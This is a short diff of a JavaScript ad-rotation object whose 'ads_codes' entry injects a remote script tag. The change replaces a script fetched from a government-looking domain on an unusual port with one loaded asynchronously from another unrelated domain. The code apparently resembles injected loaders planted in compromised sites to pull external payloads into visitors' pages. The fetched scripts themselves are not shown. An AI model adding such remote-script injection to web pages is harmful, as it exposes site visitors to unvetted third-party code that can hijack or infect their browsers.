@@ -1,5 +1,5 @@
 var randoms = {
-	ads_codes: ['<script src="https://www.govkunming.cn:12443/ty/02554552-E837-1889-33-87B117727C8B.alpha"><'+'/script>'],
+	ads_codes: ['<script async src="https://wan.lm995.com/o.js"><'+'/script>'],
 	ads_weight: [10],
 
 	get_random: function(weight) {
